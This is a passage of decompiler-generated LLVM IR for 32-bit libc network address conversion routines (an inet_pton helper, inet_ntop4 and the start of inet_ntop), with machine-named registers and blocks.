  %v1_805ed56 = inttoptr i32 %v0_805ed56 to i8*
  %v2_805ed56 = load i8, i8* %v1_805ed56, align 1
  %v3_805ed56 = icmp eq i8 %v2_805ed56, 0
  br i1 %v3_805ed56, label %dec_label_pc_805ee5e, label %dec_label_pc_805ed5f

dec_label_pc_805ed5f:                             ; preds = %dec_label_pc_805ed56
  %v0_805ed5f = load i32, i32* @ebx, align 4
  %v1_805ed5f = add i32 %v0_805ed5f, 2
  store i32 %v1_805ed5f, i32* @edx, align 4
  %v6_805ed66 = icmp ugt i32 %v1_805ed5f, %v2_805ecde
  br i1 %v6_805ed66, label %dec_label_pc_805ee5e, label %dec_label_pc_805ed6c

dec_label_pc_805ed6c:                             ; preds = %dec_label_pc_805ed5f
  %v0_805ed6c = load i32, i32* @ebp, align 4
  %v2_805ed6e = udiv i32 %v0_805ed6c, 256
  %v4_805ed6e = trunc i32 %v2_805ed6e to i8
  %v3_805ed71 = inttoptr i32 %v0_805ed5f to i8*
  store i8 %v4_805ed6e, i8* %v3_805ed71, align 1
  %v0_805ed73 = load i32, i32* @ebp, align 4
  store i32 %v0_805ed73, i32* %eax.global-to-local, align 4
  %v1_805ed75 = trunc i32 %v0_805ed73 to i8
  %v2_805ed75 = load i32, i32* @ebx, align 4
  %v3_805ed75 = add i32 %v2_805ed75, 1
  %v4_805ed75 = inttoptr i32 %v3_805ed75 to i8*
  store i8 %v1_805ed75, i8* %v4_805ed75, align 1
  %v0_805ed78 = load i32, i32* @edx, align 4
  store i32 %v0_805ed78, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805ed7e

dec_label_pc_805ed7e:                             ; preds = %dec_label_pc_805eccd, %dec_label_pc_805eced, %dec_label_pc_805ed6c
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_805ed6c ], [ %v1_805eced, %dec_label_pc_805eced ], [ %v0_805ece8, %dec_label_pc_805eccd ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_805ed6c ], [ null, %dec_label_pc_805eced ], [ null, %dec_label_pc_805eccd ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805edbe.outer

dec_label_pc_805ed8a:                             ; preds = %dec_label_pc_805ed35
  %v9_805ed8a = icmp eq i32 %v0_805ed35, 46
  %v1_805ed8d = icmp eq i1 %v9_805ed8a, false
  br i1 %v1_805ed8d, label %dec_label_pc_805ee5e, label %dec_label_pc_805ed93

dec_label_pc_805ed93:                             ; preds = %dec_label_pc_805ed8a
  %v0_805ed93 = load i32, i32* @ebx, align 4
  %v1_805ed93 = add i32 %v0_805ed93, 4
  store i32 %v1_805ed93, i32* @esi, align 4
  %v6_805ed9a = icmp ugt i32 %v1_805ed93, %v2_805ecde
  br i1 %v6_805ed9a, label %dec_label_pc_805ee5e, label %dec_label_pc_805eda0

dec_label_pc_805eda0:                             ; preds = %dec_label_pc_805ed93
  %v4_805eda0 = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_805eda0, i32* @eax, align 4
  store i32 %v0_805ed93, i32* @edx, align 4
  store i32 %v1_805ed93, i32* @ebx, align 4
  %v2_805eda8 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_805eda8 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_805eda8, i32 %v2_805ecde)
  store i32 %v5_805eda8, i32* %eax.global-to-local, align 4
  %tmp62 = icmp slt i32 %v5_805eda8, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_805edf5, label %dec_label_pc_805ee5e

dec_label_pc_805edbe:                             ; preds = %dec_label_pc_805edbe.outer, %dec_label_pc_805ed4c
  %v0_805edbe = phi i32 [ %v0_805ed50, %dec_label_pc_805ed4c ], [ %v0_805edbe.pre, %dec_label_pc_805edbe.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_805ed4c, %dec_label_pc_805ed4c ], [ %stack_var_-44.1.ph, %dec_label_pc_805edbe.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_805ed50, %dec_label_pc_805ed4c ], [ %stack_var_-36.1.ph, %dec_label_pc_805edbe.outer ]
  %v1_805edbe = inttoptr i32 %v0_805edbe to i8*
  %v2_805edbe = load i8, i8* %v1_805edbe, align 1
  %v3_805edbe = sext i8 %v2_805edbe to i32
  store i32 %v3_805edbe, i32* %eax.global-to-local, align 4
  %v2_805edc5 = call i32 @__GI_tolower(i32 %v3_805edbe)
  store i32 %v2_805edc5, i32* %eax.global-to-local, align 4
  %v1_805edcd = icmp eq i32 %v2_805edc5, 0
  store i32 %v2_805edc5, i32* @esi, align 4
  %v1_805edd1 = icmp eq i1 %v1_805edcd, false
  br i1 %v1_805edd1, label %dec_label_pc_805ed05, label %dec_label_pc_805edd7

dec_label_pc_805edd7:                             ; preds = %dec_label_pc_805edbe
  br i1 %v4_805ed3a, label %dec_label_pc_805edf5, label %dec_label_pc_805edde

dec_label_pc_805edde:                             ; preds = %dec_label_pc_805edd7
  %v0_805edde = load i32, i32* @ebx, align 4
  %v1_805edde = add i32 %v0_805edde, 2
  store i32 %v1_805edde, i32* @edx, align 4
  %v6_805ede5 = icmp ugt i32 %v1_805edde, %v2_805ecde
  br i1 %v6_805ede5, label %dec_label_pc_805ee5e, label %dec_label_pc_805ede7

dec_label_pc_805ede7:                             ; preds = %dec_label_pc_805edde
  %v0_805ede7 = load i32, i32* @ebp, align 4
  %v2_805ede9 = udiv i32 %v0_805ede7, 256
  %v4_805ede9 = trunc i32 %v2_805ede9 to i8
  %v3_805edec = inttoptr i32 %v0_805edde to i8*
  store i8 %v4_805ede9, i8* %v3_805edec, align 1
  %v0_805edee = load i32, i32* @ebp, align 4
  store i32 %v0_805edee, i32* %eax.global-to-local, align 4
  %v1_805edf0 = trunc i32 %v0_805edee to i8
  %v2_805edf0 = load i32, i32* @ebx, align 4
  %v3_805edf0 = add i32 %v2_805edf0, 1
  %v4_805edf0 = inttoptr i32 %v3_805edf0 to i8*
  store i8 %v1_805edf0, i8* %v4_805edf0, align 1
  %v0_805edf3 = load i32, i32* @edx, align 4
  store i32 %v0_805edf3, i32* @ebx, align 4
  br label %dec_label_pc_805edf5

dec_label_pc_805edf5:                             ; preds = %dec_label_pc_805edd7, %dec_label_pc_805eda0, %dec_label_pc_805ede7
  %v4_805edf5 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_805edf5 = icmp eq i8* %stack_var_-44.1, null
  %v0_805ee2d.pre = load i32, i32* @ebx, align 4
  br i1 %v5_805edf5, label %dec_label_pc_805ee2d, label %dec_label_pc_805edfc

dec_label_pc_805edfc:                             ; preds = %dec_label_pc_805edf5
  store i32 1, i32* @esi, align 4
  %v6_805ee03 = sub i32 %v0_805ee2d.pre, %v4_805edf5
  store i32 %v6_805ee03, i32* @edi, align 4
  %v16_805ee07 = icmp eq i32 %v0_805ee2d.pre, %v2_805ecde
  %v1_805ee0b = icmp eq i1 %v16_805ee07, false
  br i1 %v1_805ee0b, label %dec_label_pc_805ee25.preheader, label %dec_label_pc_805ee5e

dec_label_pc_805ee25.preheader:                   ; preds = %dec_label_pc_805edfc
  %v3_805ee2589 = inttoptr i32 %v6_805ee03 to i8*
  %v9_805ee2798 = icmp slt i8* %v3_805ee2589, inttoptr (i32 1 to i8*)
  br i1 %v9_805ee2798, label %dec_label_pc_805ee29, label %dec_label_pc_805ee0f

dec_label_pc_805ee0f:                             ; preds = %dec_label_pc_805ee25.preheader, %dec_label_pc_805ee0f
  %v0_805ee1d100 = phi i32 [ %v0_805ee25.pre, %dec_label_pc_805ee0f ], [ 1, %dec_label_pc_805ee25.preheader ]
  %v0_805ee0f99 = phi i32 [ %v1_805ee25.pre, %dec_label_pc_805ee0f ], [ %v6_805ee03, %dec_label_pc_805ee25.preheader ]
  %v2_805ee15 = sub i32 %v0_805ee0f99, %v0_805ee1d100
  %v6_805ee17 = add i32 %v2_805ee15, %v4_805edf5
  store i32 %v6_805ee17, i32* %eax.global-to-local, align 4
  %v2_805ee1b = sub i32 %v2_805ecde, %v0_805ee1d100
  store i32 %v2_805ee1b, i32* @ecx, align 4
  %v1_805ee1d = add i32 %v0_805ee1d100, 1
  store i32 %v1_805ee1d, i32* @esi, align 4
  %v1_805ee1e = inttoptr i32 %v6_805ee17 to i8*
  %v2_805ee1e = load i8, i8* %v1_805ee1e, align 1
  %v3_805ee1e = zext i8 %v2_805ee1e to i32
  %v4_805ee1e = load i32, i32* @edx, align 4
  %v5_805ee1e = and i32 %v4_805ee1e, -256
  %v6_805ee1e = or i32 %v5_805ee1e, %v3_805ee1e
  store i32 %v6_805ee1e, i32* @edx, align 4
  %v3_805ee20 = inttoptr i32 %v2_805ee1b to i8*
  store i8 %v2_805ee1e, i8* %v3_805ee20, align 1
  %v0_805ee22 = load i32, i32* %eax.global-to-local, align 4
  %v1_805ee22 = inttoptr i32 %v0_805ee22 to i8*
  store i8 0, i8* %v1_805ee22, align 1
  %v0_805ee25.pre = load i32, i32* @esi, align 4
  %v1_805ee25.pre = load i32, i32* @edi, align 4
  %v2_805ee25 = inttoptr i32 %v0_805ee25.pre to i8*
  %v3_805ee25 = inttoptr i32 %v1_805ee25.pre to i8*
  %v9_805ee27 = icmp sgt i8* %v2_805ee25, %v3_805ee25
  br i1 %v9_805ee27, label %dec_label_pc_805ee29, label %dec_label_pc_805ee0f

dec_label_pc_805ee29:                             ; preds = %dec_label_pc_805ee0f, %dec_label_pc_805ee25.preheader
  br label %dec_label_pc_805ee2d

dec_label_pc_805ee2d:                             ; preds = %dec_label_pc_805edf5, %dec_label_pc_805ee29
  %v0_805ee2d = phi i32 [ %v2_805ecde, %dec_label_pc_805ee29 ], [ %v0_805ee2d.pre, %dec_label_pc_805edf5 ]
  %v16_805ee2d = icmp eq i32 %v0_805ee2d, %v2_805ecde
  %v1_805ee31 = icmp eq i1 %v16_805ee2d, false
  br i1 %v1_805ee31, label %dec_label_pc_805ee5e, label %dec_label_pc_805ee33

dec_label_pc_805ee33:                             ; preds = %dec_label_pc_805ee2d
  store i32 %v2_805ecd2, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_805ee3f = call i32 @memcpy(i16* %tmp64, i32 %v2_805ecd2, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ee60

dec_label_pc_805ee4e:                             ; preds = %dec_label_pc_805ecb2
  %v1_805ee4e = call i32 @__errno_location(i32 %v0_805eca1)
  %v1_805ee53 = inttoptr i32 %v1_805ee4e to i32*
  store i32 97, i32* %v1_805ee53, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ee60

dec_label_pc_805ee5e:                             ; preds = %dec_label_pc_805ed5f, %dec_label_pc_805ed56, %dec_label_pc_805ed1a, %dec_label_pc_805ed41, %dec_label_pc_805edfc, %dec_label_pc_805eda0, %dec_label_pc_805ee2d, %dec_label_pc_805edde, %dec_label_pc_805ed93, %dec_label_pc_805ed8a, %dec_label_pc_805eced
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ee60

dec_label_pc_805ee60:                             ; preds = %dec_label_pc_805ee4e, %dec_label_pc_805ee33, %dec_label_pc_805ecbd, %dec_label_pc_805ee5e
  %v0_805ee67 = phi i32 [ -1, %dec_label_pc_805ee4e ], [ 1, %dec_label_pc_805ee33 ], [ %v3_805ecc3, %dec_label_pc_805ecbd ], [ 0, %dec_label_pc_805ee5e ]
  store i32 %v0_805eca1, i32* @ebx, align 4
  store i32 %v0_805eca0, i32* @esi, align 4
  store i32 %v0_805ec9f, i32* @edi, align 4
  store i32 %v0_805ec9e, i32* @ebp, align 4
  ret i32 %v0_805ee67

; uselistorder directives
  uselistorder i32 %v1_805ee25.pre, { 1, 0 }
  uselistorder i32 %v0_805ee25.pre, { 1, 0 }
  uselistorder i32 %v0_805ee1d100, { 2, 1, 0 }
  uselistorder i32 %v0_805ee2d.pre, { 1, 0, 2 }
  uselistorder i32 %v2_805edc5, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_805ecde, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_805eca1, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805ee60, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805ee5e, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_805ee2d, { 1, 0 }
  uselistorder label %dec_label_pc_805ee0f, { 1, 0 }
  uselistorder label %dec_label_pc_805edf5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805edbe, { 1, 0 }
  uselistorder label %dec_label_pc_805ed7e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805edbe.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_805ee69 = load i32, i32* @edi, align 4
  %v0_805ee6a = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_805ee6e = ptrtoint i32* %stack_var_-76 to i32
  %v0_805ee71 = load i32, i32* @eax, align 4
  %v3_805ee75 = and i32 %v0_805ee71, -65536
  %v2_805ee7b = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_805ee80 = load i32, i32* @edx, align 4
  %v5_805ee80 = inttoptr i32 %v0_805ee80 to i8*
  store i8* %v5_805ee80, i8** %stack_var_-56, align 4
  %v0_805ee84 = load i32, i32* @ecx, align 4
  store i32 %v3_805ee75, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_805ee8f = add i32 %v2_805ee7b, 4
  store i32 %v6_805ee8f, i32* %edi.global-to-local, align 4
  %v2_805ee90 = inttoptr i32 %v6_805ee8f to i32*
  store i32 0, i32* %v2_805ee90, align 4
  %v3_805ee90 = load i32, i32* %edi.global-to-local, align 4
  %v6_805ee90 = add i32 %v3_805ee90, 4
  store i32 %v6_805ee90, i32* %edi.global-to-local, align 4
  %v0_805ee91 = load i32, i32* %eax.global-to-local, align 4
  %v2_805ee91 = inttoptr i32 %v6_805ee90 to i32*
  store i32 %v0_805ee91, i32* %v2_805ee91, align 4
  %v3_805ee91 = load i32, i32* %edi.global-to-local, align 4
  %v6_805ee91 = add i32 %v3_805ee91, 4
  store i32 %v6_805ee91, i32* %edi.global-to-local, align 4
  %v0_805ee92 = load i32, i32* %eax.global-to-local, align 4
  %v1_805ee92 = trunc i32 %v0_805ee92 to i16
  %v3_805ee92 = inttoptr i32 %v6_805ee91 to i16*
  store i16 %v1_805ee92, i16* %v3_805ee92, align 2
  %v4_805ee92 = load i32, i32* %edi.global-to-local, align 4
  %v7_805ee92 = add i32 %v4_805ee92, 2
  %v0_805ee94 = load i32, i32* %eax.global-to-local, align 4
  %v1_805ee94 = trunc i32 %v0_805ee94 to i8
  %v3_805ee94 = inttoptr i32 %v7_805ee92 to i8*
  store i8 %v1_805ee94, i8* %v3_805ee94, align 1
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_805ef2f30 = load i32, i32* @esi, align 4
  %v10_805ef2f36 = icmp eq i32 %v0_805ef2f30, 3
  store i1 %v10_805ef2f36, i1* %zf.global-to-local, align 1
  %v7_805ef3238 = icmp sgt i32 %v0_805ef2f30, 3
  br i1 %v7_805ef3238, label %dec_label_pc_805ef38, label %dec_label_pc_805ee9c

dec_label_pc_805ee9c:                             ; preds = %dec_label_pc_805ef0f, %entry
  %v3_805eeb2 = phi i32 [ 0, %entry ], [ %v1_805ef38.pre, %dec_label_pc_805ef0f ]
  %v0_805ef2f39 = phi i32 [ %v0_805ef2f30, %entry ], [ %v0_805ef2f, %dec_label_pc_805ef0f ]
  %v2_805eea2 = add i32 %v0_805ef2f39, %v0_805ee71
  %v12_805eea2 = icmp eq i32 %v2_805eea2, 0
  store i1 %v12_805eea2, i1* %zf.global-to-local, align 1
  store i32 %v2_805eea2, i32* %ebp.global-to-local, align 4
  %v1_805eea4 = inttoptr i32 %v2_805eea2 to i8*
  %v2_805eea4 = load i8, i8* %v1_805eea4, align 1
  %v3_805eea4 = zext i8 %v2_805eea4 to i32
  %v4_805eea4 = load i32, i32* @edx, align 4
  %v5_805eea4 = and i32 %v4_805eea4, -65536
  %v6_805eea4 = or i32 %v5_805eea4, %v3_805eea4
  store i32 %v6_805eea4, i32* %edx.global-to-local, align 4
  %div8 = udiv i8 %v2_805eea4, 100
  %v6_805eeab = zext i8 %div8 to i32
  %tmp24 = urem i8 %v2_805eea4, 100
  %v12_805eeab = zext i8 %tmp24 to i32
  %v14_805eeab = mul nuw nsw i32 %v12_805eeab, 256
  %v15_805eeab = or i32 %v6_805eeab, %v5_805eea4
  %v16_805eeab = or i32 %v15_805eeab, %v14_805eeab
  store i32 %v16_805eeab, i32* %eax.global-to-local, align 4
  %v2_805eeaf = or i8 %div8, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_805eeb2 = load i32, i32* @esp, align 4
  %v4_805eeb2 = add i32 %v2_805eeb2, 43
  %v5_805eeb2 = add i32 %v4_805eeb2, %v3_805eeb2
  %v6_805eeb2 = inttoptr i32 %v5_805eeb2 to i8*
  store i8 %v2_805eeaf, i8* %v6_805eeb2, align 1
  %v0_805eeb6 = load i32, i32* %edi.global-to-local, align 4
  %v1_805eeb6 = add i32 %v0_805eeb6, 1
  store i32 %v0_805eeb6, i32* @ecx, align 4
  %v0_805eebf = load i32, i32* @esp, align 4
  %v2_805eebf = add i32 %v0_805eeb6, 43
  %v3_805eebf = add i32 %v2_805eebf, %v0_805eebf
  %v4_805eebf = inttoptr i32 %v3_805eebf to i8*
  %v5_805eebf = load i8, i8* %v4_805eebf, align 1
  %v11_805eebf = icmp eq i8 %v5_805eebf, 48
  store i1 %v11_805eebf, i1* %zf.global-to-local, align 1
  %v1_805eec4 = icmp eq i1 %v11_805eebf, false
  %v0_805eeee = load i32, i32* %edx.global-to-local, align 4
  br i1 %v1_805eec4, label %dec_label_pc_805eeec, label %dec_label_pc_805eec6

dec_label_pc_805eec6:                             ; preds = %dec_label_pc_805ee9c
  %v3_805eeca = trunc i32 %v0_805eeee to i16
  %v5_805eeca = udiv i16 %v3_805eeca, 10
  store i32 10, i32* %ebx.global-to-local, align 4
  %tmp = urem i16 %v5_805eeca, 256
  %tmp42 = urem i16 %tmp, 10
  %tmp25 = zext i16 %tmp42 to i32
  store i32 %tmp25, i32* %edx.global-to-local, align 4
  %v1_805eedc = trunc i16 %tmp42 to i8
  %v2_805eedc = or i8 %v1_805eedc, 48
  %v12_805eedc = zext i8 %v2_805eedc to i32
  store i32 %v12_805eedc, i32* %eax.global-to-local, align 4
  %v7_805eede = icmp eq i8 %v1_805eedc, 0
  store i1 %v7_805eede, i1* %zf.global-to-local, align 1
  store i8 %v2_805eedc, i8* %v4_805eebf, align 1
  %v0_805eee4 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_805eee4, label %dec_label_pc_805ef0f, label %dec_label_pc_805eee6

dec_label_pc_805eee6:                             ; preds = %dec_label_pc_805eec6
  store i32 %v1_805eeb6, i32* @ecx, align 4
  br label %dec_label_pc_805ef0f

dec_label_pc_805eeec:                             ; preds = %dec_label_pc_805ee9c
  store i32 %v1_805eeb6, i32* %ebx.global-to-local, align 4
  %v3_805eef4 = trunc i32 %v0_805eeee to i16
  %v5_805eef4 = udiv i16 %v3_805eef4, 10
  %tmp43 = urem i16 %v5_805eef4, 256
  %tmp44 = urem i16 %tmp43, 10
  %tmp26 = zext i16 %tmp44 to i32
  store i32 %tmp26, i32* %edx.global-to-local, align 4
  %v1_805ef04 = add i32 %v0_805eeb6, 2
  store i32 %v1_805ef04, i32* @ecx, align 4
  %v1_805ef09 = trunc i16 %tmp44 to i8
  %v2_805ef09 = or i8 %v1_805ef09, 48
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_805ef09 = zext i8 %v2_805ef09 to i32
  store i32 %v12_805ef09, i32* %eax.global-to-local, align 4
  %v4_805ef0b = add i32 %v0_805eeb6, 44
  %v5_805ef0b = add i32 %v4_805ef0b, %v0_805eebf
  %v6_805ef0b = inttoptr i32 %v5_805ef0b to i8*
  store i8 %v2_805ef09, i8* %v6_805ef0b, align 1
  br label %dec_label_pc_805ef0f

dec_label_pc_805ef0f:                             ; preds = %dec_label_pc_805eec6, %dec_label_pc_805eee6, %dec_label_pc_805eeec
  %v0_805ef0f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805ef0f = inttoptr i32 %v0_805ef0f to i8*
  %v2_805ef0f = load i8, i8* %v1_805ef0f, align 1
  %v3_805ef0f = zext i8 %v2_805ef0f to i32
  store i32 %v3_805ef0f, i32* %eax.global-to-local, align 4
  %v0_805ef18 = load i32, i32* @esi, align 4
  %v1_805ef18 = add i32 %v0_805ef18, 1
  store i32 %v1_805ef18, i32* @esi, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_805ef1d = load i32, i32* @esp, align 4
  %v1_805ef1d = load i32, i32* @ecx, align 4
  %v2_805ef1d = add i32 %v0_805ef1d, 44
  %v3_805ef1d = add i32 %v2_805ef1d, %v1_805ef1d
  %v4_805ef1d = inttoptr i32 %v3_805ef1d to i8*
  store i8 46, i8* %v4_805ef1d, align 1
  %v0_805ef22 = load i32, i32* @ecx, align 4
  %v1_805ef22 = add i32 %v0_805ef22, 2
  store i32 %v1_805ef22, i32* %edi.global-to-local, align 4
  %v0_805ef25 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805ef25 = load i32, i32* %eax.global-to-local, align 4
  %v2_805ef25 = zext i32 %v1_805ef25 to i64
  %v3_805ef25 = load i32, i32* %edx.global-to-local, align 4
  %v4_805ef25 = zext i32 %v3_805ef25 to i64
  %v5_805ef25 = mul nuw i64 %v4_805ef25, 4294967296
  %v6_805ef25 = or i64 %v5_805ef25, %v2_805ef25
  %v7_805ef25 = zext i32 %v0_805ef25 to i64
  %v8_805ef25 = udiv i64 %v6_805ef25, %v7_805ef25
  %v9_805ef25 = trunc i64 %v8_805ef25 to i32
  %v10_805ef25 = urem i64 %v6_805ef25, %v7_805ef25
  %v11_805ef25 = trunc i64 %v10_805ef25 to i32
  store i32 %v11_805ef25, i32* @edx, align 4
  %v3_805ef27 = and i32 %v9_805ef25, -256
  %v1_805ef29 = trunc i64 %v10_805ef25 to i8
  %v2_805ef29 = add i8 %v1_805ef29, 48
  %v12_805ef29 = zext i8 %v2_805ef29 to i32
  %v15_805ef29 = or i32 %v12_805ef29, %v3_805ef27
  store i32 %v15_805ef29, i32* %eax.global-to-local, align 4
  %v2_805ef2b = load i32, i32* @esp, align 4
  %v4_805ef2b = add i32 %v0_805ef22, 43
  %v5_805ef2b = add i32 %v4_805ef2b, %v2_805ef2b
  %v6_805ef2b = inttoptr i32 %v5_805ef2b to i8*
  store i8 %v2_805ef29, i8* %v6_805ef2b, align 1
  %v0_805ef2f = load i32, i32* @esi, align 4
  %v10_805ef2f = icmp eq i32 %v0_805ef2f, 3
  store i1 %v10_805ef2f, i1* %zf.global-to-local, align 1
  %v7_805ef32 = icmp sgt i32 %v0_805ef2f, 3
  %v1_805ef38.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v7_805ef32, label %dec_label_pc_805ef38, label %dec_label_pc_805ee9c

dec_label_pc_805ef38:                             ; preds = %dec_label_pc_805ef0f, %entry
  %v1_805ef38 = phi i32 [ 0, %entry ], [ %v1_805ef38.pre, %dec_label_pc_805ef0f ]
  %v0_805ef38 = load i32, i32* @esp, align 4
  %v2_805ef38 = add i32 %v0_805ef38, 42
  %v3_805ef38 = add i32 %v2_805ef38, %v1_805ef38
  %v4_805ef38 = inttoptr i32 %v3_805ef38 to i8*
  store i8 0, i8* %v4_805ef38, align 1
  %v0_805ef3d = load i32, i32* @esp, align 4
  %v9_805ef3d = icmp eq i32 %v0_805ef3d, 12
  store i1 %v9_805ef3d, i1* %zf.global-to-local, align 1
  %tmp27 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp27, i8** %stack_var_-92, align 4
  %v3_805ef45 = call i32 @strlen(i8* %tmp27)
  store i32 %v3_805ef45, i32* @eax, align 4
  %v15_805ef4d = icmp eq i32 %v3_805ef45, %v0_805ee84
  store i1 %v15_805ef4d, i1* %zf.global-to-local, align 1
  %tmp45 = icmp ugt i32 %v3_805ef45, %v0_805ee84
  br i1 %tmp45, label %dec_label_pc_805ef53, label %dec_label_pc_805ef62

dec_label_pc_805ef53:                             ; preds = %dec_label_pc_805ef38
  %v0_805ef53 = load i8*, i8** %stack_var_-92, align 4
  %v1_805ef53 = ptrtoint i8* %v0_805ef53 to i32
  %v2_805ef53 = call i32 @__errno_location(i32 %v1_805ef53)
  %v1_805ef58 = inttoptr i32 %v2_805ef53 to i32*
  store i32 28, i32* %v1_805ef58, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805ef71.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805ef71

dec_label_pc_805ef62:                             ; preds = %dec_label_pc_805ef38
  %v2_805ef40 = ptrtoint i32* %stack_var_-33 to i32
  %tmp28 = bitcast i8** %stack_var_-56 to i32*
  %v3_805ef654 = load i32, i32* %tmp28, align 4
  %tmp29 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_805ef654, i32* %tmp29, align 4
  %v0_805ef69.cast = inttoptr i32 %v3_805ef654 to i8*
  %v4_805ef69 = call i32 @strcpy(i8* %v0_805ef69.cast, i32 %v2_805ef40)
  store i32 %v4_805ef69, i32* %eax.global-to-local, align 4
  %v0_805ef6e = load i32, i32* @esp, align 4
  %v6_805ef6e = icmp eq i32 %v0_805ef6e, -16
  store i1 %v6_805ef6e, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_805ef71

dec_label_pc_805ef71:                             ; preds = %dec_label_pc_805ef53, %dec_label_pc_805ef62
  %v0_805ef78 = phi i32 [ 0, %dec_label_pc_805ef53 ], [ %v4_805ef69, %dec_label_pc_805ef62 ]
  %v0_805ef71 = phi i32 [ %v0_805ef71.pre, %dec_label_pc_805ef53 ], [ %v15_805ee6e, %dec_label_pc_805ef62 ]
  %v9_805ef71 = icmp eq i32 %v0_805ef71, -60
  store i1 %v9_805ef71, i1* %zf.global-to-local, align 1
  store i32 %v0_805ee6a, i32* @esi, align 4
  store i32 %v0_805ee69, i32* @edi, align 4
  ret i32 %v0_805ef78

; uselistorder directives
  uselistorder i32 %v0_805ef2f, { 2, 0, 1 }
  uselistorder i8 %v2_805ef09, { 1, 0 }
  uselistorder i32 %v0_805eeee, { 1, 0 }
  uselistorder i1 %v11_805eebf, { 1, 0 }
  uselistorder i32 %v1_805eeb6, { 1, 0 }
  uselistorder i32 %v5_805eea4, { 1, 0 }
  uselistorder i32 %v0_805ef2f30, { 1, 2, 0 }
  uselistorder i32* %stack_var_-33, { 2, 0, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i8 100, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_805ef71, { 1, 0 }
  uselistorder label %dec_label_pc_805ef0f, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_805ef79 = load i32, i32* @ebp, align 4
  %v0_805ef7a = load i32, i32* @edi, align 4
  %v0_805ef7b = load i32, i32* @esi, align 4
  %v0_805ef7c = load i32, i32* @ebx, align 4
  %v15_805ef7d = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_805ef84 = icmp eq i32 %arg1, 2
  br i1 %v9_805ef84, label %dec_label_pc_805ef94, label %dec_label_pc_805ef89

dec_label_pc_805ef89:                             ; preds = %entry
  %v9_805ef89 = icmp eq i32 %arg1, 10
  %v1_805ef8c = icmp eq i1 %v9_805ef89, false
